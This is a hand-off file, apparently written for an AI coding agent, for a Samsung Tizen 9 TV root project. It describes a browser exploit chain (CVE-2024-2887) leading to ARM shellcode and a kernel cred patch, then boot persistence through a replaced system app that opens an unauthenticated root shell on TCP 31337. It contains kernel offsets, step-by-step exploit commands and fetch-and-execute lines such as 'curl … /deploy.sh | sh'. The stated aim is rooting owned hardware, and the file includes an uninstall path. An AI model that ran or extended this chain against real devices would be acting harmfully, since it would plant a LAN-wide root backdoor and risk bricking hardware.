# AGENTS.md — hand-off for the next agent or human

You are continuing a **Samsung Tizen 9 TV root** project. Read this file first,
then `docs/EXPLOIT.md` (how it works), `docs/USAGE.md` (running it),
`docs/ROOT-METHODS.md` (what was found), `docs/FAILED.md` (do not repeat these),
`docs/SERVER-HOSTING.md` (the PC-side server) and `docs/REMOTE.md`
(remote/hotkey remapping). History lives in `CHANGELOG.md`.

## 0. Maintaining this repo — read before editing

**Any change you make must be recorded in [`CHANGELOG.md`](CHANGELOG.md).** Add an
entry under `Unreleased` (or a dated batch if you are landing several related
changes together), listing what changed and **why**. If you change a script's
behaviour, a payload offset, a documented procedure or a trap, the changelog entry
is part of the change — not an optional extra.

Division of labour:

| File | What it holds |
|---|---|
| `CHANGELOG.md` | dated history: what changed and why |
| `docs/` | the *how*: exploit chain, usage, root methods, dead ends, portability |
| this file | the *state now*: current status, procedures, verification, traps |

Do not put dated narrative here; put it in the changelog and link to it.

## 1. Current state

**Rooted and persistent.** The TV roots itself during boot through the replaced IL of
the stock on-boot app `com.samsung.tv.MultiControl-Service`, then serves a command
channel on TCP 31337 (line protocol, replies end with `__END__`).

| | |
|---|---|
| Payload | v9, 19,456 B, md5 `ffdb936f5263a04a26b4727ee8307151` (`server/payload.dll`, source `payload/`) |
| Boot-to-root | ~40 s, measured 38–47 s across boots, with no PC and no browser |
| Root identity | `uid=0`, `CapEff=0x3fffffffff`, running under the app's own SMACK label |
| Boot hook | a `boot_sequence` row in `/opt/dbspace/user/5001/.appsvc.db` |
| Device | `/dev/video40`, one RDWR opener; the app runs as uid 5001, gid 44 |

The boot sequence is deliberate: the first launch after a cold boot usually cannot read
task memory coherently, so the payload makes one short attempt, exits on purpose, and
lets AUL relaunch it (~1–4 s). A fresh process re-maps the device and succeeds. Four
fast attempts are allowed (counter in `/tmp/.dsh_try`, which resets at boot), then a
long in-process fallback takes over.

Verified independently: two cold boots after a power-cycle (43 s and 47 s from
power-on, no PC involvement) and one full run from a stock TV through the one-click
flow. The sequence of changes that got here is in `CHANGELOG.md`.

**Fallback if the payload is ever missing:** `python tools/tv_rootwatch.py` with the TV
browser on the exploit page hands back a root shell on `127.0.0.1:9999`; run
`server/recover.sh` from that shell to reinstall the payload.

Payload lineage (v5 → v9, and what each version fixed) is in `CHANGELOG.md`; the label
regression that broke boot persistence is `docs/BOOT-REGRESSION-SMACK.md`.
## 2. Target facts

| Item | Value |
|---|---|
| Model / platform | QNX1D series, 2024 Neo QLED (QTV T09 platform) |
| OS | Tizen 9 |
| Kernel | Linux 5.4.249, ARM32 LPAE, `PHYS_OFFSET 0x20000000` |
| Browser | Chromium 120.0.6099.5 (WasmGC available) |
| Kernel Image | phys `0x20008000`, signature `ee4400eb00900fe1` |
| `init_task` | `0xC0957180` (phys `0x20957180`) |
| Task list offset | `0x23C` (`prev` links; `next` unusable) |
| cred / real_cred / comm | task+`0x3F8` / `0x3F4` / `0x400` |
| Full caps | `0x0000003fffffffff` |
| Root channel | TCP `31337` |

These constants are specific to this firmware build. Before using the toolkit on
another model or firmware, re-measure the Image base, `init_task`, the task-list
offset and the cred offsets, and verify the physmap still works (see
`README.md` → Compatibility).

## 3. Architecture

```
TV browser (uid 5001, gid 44 video)
  └─ index.html ──CVE-2024-2887──▶ renderer R/W + ARM shellcode
        └─ physmap stub: opens /dev/video40, serves RPC over TCP/80
              ▲
PC            │ server/server.py (port 80: page + RPC gateway on 127.0.0.1:9998)
              │ tools/auto_root.py / kernel_root.py / physmap.py / root_shell.py
              ▼
TV boot: com.samsung.tv.MultiControl-Service (dotnet-inhouse, app_onboot)
  └─ MultiControlService.dll (payload) ─▶ physmap ─▶ cred patch ─▶ TCP 31337
```

## 4. Required tools

- **PC on the same LAN.** The TV must reach the PC's TCP/80; the PC must reach
  the TV's TCP/31337.
- **Python 3** for the server and clients.
  - On Windows the base `python.exe` path was blocked by a firewall rule; the
    server was run under a renamed copy (`pysrv.exe`). Any interpreter the
    firewall permits works; `root.ps1` auto-detects one.
- **.NET SDK 6+** only to rebuild the boot payload.
- **keystone + capstone** (Python) only to rebuild `tools/physrpc.S` into
  shellcode.
- No sdb, no Tizen Studio, no firmware images, no flashing.

## 5. Files

`root.ps1` is the one-command entry point; it expects this layout:

| File | Purpose |
|---|---|
| `server/server.py` | port-80 HTTP server + RPC gateway + shell bridge |
| `server/index.html` | page that loads the browser chain |
| `server/payloads/browser_payload.js` | browser V8 payload (hdbreaker chain + physrpc) |
| `server/lib/wasm_builder.js` | WasmGC helper used by the payload |
| `server/deploy.sh` | deploy script executed on the TV as root (verifies md5) |
| `server/uninstall.sh` | restores the stock app (run via the channel) |
| `server/payload.dll` | the root-on-boot payload served to the TV |
| `tools/physmap.py` | RPC client (hello, read/write, ops) |
| `tools/kernel_root.py` | finds the kernel/`init_task`/task and patches the cred |
| `tools/auto_root.py` | waits for a stub, roots it, runs the deploy script |
| `tools/root_shell.py` | root-channel client (TCP 31337) |
| `tools/run_root.py` | run a shell command as root via op 7 (manual) |
| `tools/write_root.py` | write a file as root via op 8 (manual) |
| `tools/physrpc.S` | ARM32 RPC stub source |
| `tools/build_physrpc.py` | assembles the stub (keystone/capstone) |
| `tools/taskwalk.py` | task-list chain diagnostic (`next`/`prev`) |
| `payload/Program.cs` | boot payload source (v7) |
| `payload/BootPayload.csproj` | net6.0 project, assembly `MultiControlService` |
| `root.ps1` | one-command runner (server + root + deploy + verify) |
| `uninstall.ps1` | one-command uninstall (restore stock + verify) |
| `server/logs/` | **all runtime output** (created on demand, git-ignored) |

### Logs

Everything the toolkit writes at runtime goes under `server/logs/`, so the
toolkit directory itself stays clean:

| Path | What |
|---|---|
| `logs/server.out`, `logs/server.err` | stdout/stderr of the server, redirected there by `root.ps1` / `uninstall.ps1` |
| `logs/shell.log`, `logs/shell.log.1` | rolling capture of the TV shell/console (8 MB rotation) |
| `logs/beacons.log` | one timestamped line per `DSHROOT …` beacon from the payload — **the fastest way to see whether the app started at all** |
| `logs/tv/tv_output_*.txt` | dumps the exploit page POSTs to `/save` (kept to the newest 100; override with `TV_OUTPUT_KEEP`) |

`/logs/**` is refused by the HTTP server (404), so the directory is never served
to the LAN even though it sits inside the docroot. If you run `server.py`
yourself, it creates `logs/` next to itself; only the two redirect files are the
launcher's responsibility.

### Root without the app payload (host watchdog)

If the payload is not installed (or the TV was just uninstalled), root is
available through the browser lane plus a watchdog:

```
# after each boot, with the TV browser on http://<pc>/index.html
python tools/tv_rootwatch.py          # root the stub, then op5 -> shell on :9999
```

`tools/tv_rootwatch.py` starts `server/server.py` with `pysrv.exe` if port 80 is
down, attaches to the RPC gateway, and roots the stub - tail walk for the
`PHYSRPC1` comm first, otherwise a content scan for owner creds
(`ids = 5001,100 x4` at `cred+4`, bounded to phys `0x20000000-0x40000000` because
reads past `0x46000000` hang the stub). With the shell step it then sends op 5, so
**`127.0.0.1:9999` becomes an interactive root shell** (`id -u` -> `0`); it dies
when the page reloads, so re-run the watchdog after a reload.

Note: once the browser process's cred has been patched in a boot, new renderers
inherit it, so later stubs come up already root and the watchdog reports
`root: already`. A reboot clears that - the watchdog then does the real work.

The only manual step is the page load. Set the TV browser's start page to the
URL once and re-running the watchdog is all that is needed after a boot.

### Wedged stubs: `RSET` instead of a server restart

A stub can stop answering without the TCP socket closing - typically after an
`op 5` (EXEC) or `op 7` (RUN) consumed it, or after a TV power cycle that left a
half-open socket. The gateway used to keep such a socket as its current pairing
forever, so every later client got a cached hello and nothing else, and the only
cure was restarting the server.

Now the gateway accepts a 4-byte **`RSET`** sentinel instead of a tunnel client:
it closes the paired TV socket and replies `OK` (or `IDLE` if nothing was
paired). Use it from Python:

```python
import physmap; print(physmap.reset_stub())   # "OK" / "IDLE" / "no-gateway(...)"
```

The next page load then pairs cleanly. The tools call it automatically
automatically when no live stub answers. Treat a stub as single-use for `op 7`
and never send FILE (op 8) bytes to a stub that has already been turned into a
shell - that corrupts the stream and wastes the page load.

### Repository hygiene (`.gitignore`, `.gitattributes`)

**Committed** (36 files, ~380 KB on a fresh clone): `docs/`, `payload/*.cs` +
`*.csproj`, `server/{server.py,index.html,payload.dll,deploy.sh,uninstall.sh,diag.sh}`,
`server/lib/`, `server/payloads/`, `tools/*.py|*.S|*.txt`, `root.ps1`,
`uninstall.ps1`, `AGENTS.md`, `README.md`, `NOTICE.md`.

**Ignored**: `server/logs/` (runtime), `payload/obj/` + `payload/out/` +
`payload/bin/` (rebuildable: `cd payload && dotnet build -c Release`),
`tools/__pycache__/`, `server/deploy_local.sh` (per-host, contains the PC IP),
`.root_probe`, plus the usual editor/OS/scratch/secret patterns and
`*.tpk`/`*.wgt`.

`server/payload.dll` is committed **deliberately** — it is the artifact the TV
fetches during deploy, and it is byte-identical to
`payload/out/MultiControlService.dll` (md5 `ffdb936f…`), so the repo runs
without a .NET SDK.

`.gitattributes` pins `*.sh`/`*.py` to **LF**: the TV's busybox `sh` treats a CR
as part of the token (`#!/bin/sh^M: not found`), so a Windows checkout must not
rewrite them. `*.ps1` is CRLF; DLLs and other binaries are marked `binary`.

Not needed at runtime: `payload/` source, docs, `.NET SDK`.

## 6. Reproduce the root from scratch

**Fast path:** `pwsh -File root.ps1 -TvIp <tv-ip>` does steps 0–4 and 6 below
(use `-DryRun` first). It needs `tools/` + `server/` beside it, or
`-ToolkitDir`; it reuses a server already serving `index.html`, and
`-RestartServer` replaces a different server on port 80. The manual steps that
remain are on the TV remote: load the page, then reboot.

Placeholders: `<HOST_IP>` = PC, `<TV_IP>` = TV.

```sh
# 0. on the PC
cd server
python server.py                        # or: pysrv.exe server.py

# 1. on the TV browser open
#    http://<HOST_IP>/index.html
#    wait for HARNESS_UP / WASM_LOADED / PAYLOAD_LOADED / RUNNING
#    do not open another tab; do not reload after RUNNING

# 2. root the renderer (fresh stub!)
cd ../tools
python kernel_root.py --fork
#    accept ONLY: ids = (5001, 100, 5001, 100, ...) then
#                 uid=0 cap_permitted=0x3fffffffff
#    if ids = (0,0,...) -> the cred was already patched (root) or bogus;
#    if it says "skip ... (not a cred)" -> reload the page and retry

# 3. verify
python run_root.py "id" 6               # uid=0(root)

# 4. deploy the boot payload
python run_root.py "curl -s http://<HOST_IP>/deploy.sh | sh" 45
#    expect: UID=0, SIZE=17920, MD5=d247e67a..., COPY=ok, DEPLOY_DONE

# 5. reboot the TV (exit the browser first so it does not restore the page)

# 6. permanent root
python root_shell.py "id"               # uid=0(root)
python root_shell.py "cat /proc/self/status | grep -E '^Uid|^CapEff'"
```

`tools/auto_root.py` automates steps 2 and 4: start it, then load the page once.

## 7. Verification checklist

- [ ] `root_shell.py "id"` returns `uid=0(root)`.
- [ ] `root_shell.py "cat /proc/self/status | grep CapEff"` → `0000003fffffffff`.
- [ ] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll"` → `d247e67a…`.
- [ ] Cold boot with the browser closed → channel is back within ~60–90 s.
- [ ] `kill -9 <app pid>` → channel back in ~12 s, still uid 0.

## 8. Traps (each cost hours — read `docs/FAILED.md`)

1. **Stub lifetime is minutes.** The renderer is killed by the browser
   watchdog while blocked in the shellcode. Deploy in one batch.
2. **Reloading the page kills the stub.** Each load = a new stub; root it and
   deploy without reloading.
3. **One `/dev/video40` RDWR opener.** If the boot payload holds it, the
   browser cannot; the payload must close it after rooting.
4. **`fork()` copies the cred.** Patch the parent found via `real_parent`, not
   the child.
5. **Kernel pointers can be above `0xE0000000`** (LPAE 1 GB direct map). Never
   bound kernel pointers at `0xE0000000`.
6. **Post-fork managed code.** Use a pre-pinned buffer + raw
   `syscall(172,15,…)` in the child; a CLR allocation can deadlock.
7. **Short commands.** Op 7 commands over ~100 chars can kill the stub; use
   `curl …/deploy.sh | sh`.
8. **Do not fork repeatedly on one stub**; zombies poison the task walk.
9. **Do not touch `/mnt/systemrw`** (OTA/update data) and do not poke
   `/dev/tztv_tcon` (TCON flash = brick risk).
10. **Keep TV auto-update off.** An OTA replaces the app and the boot row.
11. **The browser payload's callback IP is baked into the shellcode.** If the PC
    IP changes, rebuild `tools/physrpc.S` (`build_physrpc.py`) and re-embed the
    shellcode in `server/payloads/browser_payload.js`; `root.ps1` only rewrites
    the deploy script.

## 9. Rebuilding the payload

```sh
cd payload
dotnet build -c Release -o out
# new file: out/MultiControlService.dll
```

Then deploy it with the browser root channel (`write_root.py` or a `deploy.sh`
that downloads it) and reboot. Things to preserve when editing `Program.cs`:

- `Kptr(v) => v >= 0xC0000000` (accept the full 32-bit direct map).
- Child tag via `GCHandle`-pinned bytes + `syscall(172, 15, ptr, 0,0,0,0)`.
- `Thread.Sleep(600)` in the parent after `fork()`.
- Patch the **parent** task's cred (`real_parent`), not the child's.
- Close `_fd` after rooting, before `RootChannel()`.
- Keep the channel line protocol and the `__END__` terminator.

## 10. Recovery

- **Payload fails to root at boot, channel down:** the browser path still works.
  Load `index.html` and run `root.ps1` again — or, from a root shell,
  `server/recover.sh`. If `/dev/video40` is held by the failed payload, wait
  (~2 min, it exits) or power-cycle.
- **Restore stock app / uninstall:** `pwsh -File uninstall.ps1 -TvIp <tv-ip>`. It
  uses the 31337 channel to run `server/uninstall.sh`, which md5-checks and
  restores the stock IL + AOT (relabelled), deletes the boot row unless
  `-KeepBoot`, and verifies the table. It then waits through the reboot and
  confirms 31337 stays closed — **the power-cycle is yours to do**, the script
  only waits for it. Manual fallback if the channel is down: load `index.html`,
  `kernel_root.py --fork`, then
  `run_root.py "curl -s http://<HOST_IP>/uninstall.sh | sh" 120` (the default
  wait is 3 s, far too short).
- **Backups on the TV:** `mcs_orig.dll` (original IL),
  `mcs_ni_orig.dll` (original AOT), `bin/.native_image.disabled.<epoch>`.
  `payload_backup.dll` is whatever was in `bin/` before the last deploy — it is
  **not** guaranteed to be stock, so uninstall never uses it (it restores from
  `mcs_orig.dll` and checks the md5).
- **Browser stub rebuild:** `tools/physrpc.S` + `tools/build_physrpc.py`; the
  shellcode must then be re-embedded in `browser_payload.js` (manual step).

## 11. Open work

- Bind 31337 to a single address instead of `0.0.0.0`. Partly mitigated in v7:
  the payload checks the peer IP against `rootchan.allow` (one address, written
  by `deploy.sh`), so only that host is served — but the socket still listens on
  all interfaces.
- ~~Retry `open("/dev/video40")` instead of sleeping 120 s~~ — **done in v7**
  (120 s retry), so a browser stub holding the device no longer costs a cycle.
- ~~Replace the task-list walk with a list-independent locator~~ — **done**: `tools/scan_cred.py` finds creds by content
  (`ids = 5001,100 ×4` at `cred+4`, refcount-checked) and patches them; 253
  creds were rooted in one pass with no task list at all. The walk is still used
  when it happens to work (fresh stub), and the pid-hash/IDR routes remain
  blocked for the reasons recorded below.
  pid-hash and IDR locators are both blocked on this kernel (no kallsyms, and
  `init_pid_ns` has no `idr` field) — the cred-content scan above made them
  unnecessary. Full reasoning: `docs/SCRIPT-REVIEW.md`.
- Automate re-embedding the shellcode in `browser_payload.js` after a rebuild.
- Repoint the remote's app buttons by patching `com.samsung.tv.hotkey-service`
  (see `docs/REMOTE.md`): capture the `XF86AppN` key, decompile the service IL,
  change the appid, deploy with a backup, test one button.
- Add a `next.dll` self-update flow test (the code path exists but is unused).
- Re-measure offsets on other Tizen 9 models; the physmap primitive may be
  shared even where the constants differ.
- Measure OTA behaviour (does an update replace the app/boot row?).

## 12. Safety rules

- Only on hardware you own. A bad physical write can brick the TV.
- One change at a time; verify with `root_shell.py` after each.
- Never overwrite unknown system files; keep the backups.
- The root channel is unauthenticated: treat it as a LAN-wide root backdoor.

* **Recovery:** `server/recover.sh` — paste it into a root shell on the TV
  (`curl -s http://<pc>/recover.sh | sh`) to reinstall the payload end-to-end: it
  takes the app's SMACK label via `/proc/self/attr/current`, runs `deploy.sh`, and
  `deploy.sh` restarts the app so the new DLL loads. Verified on
  a cold boot (31337 in 41 s, no PC involvement).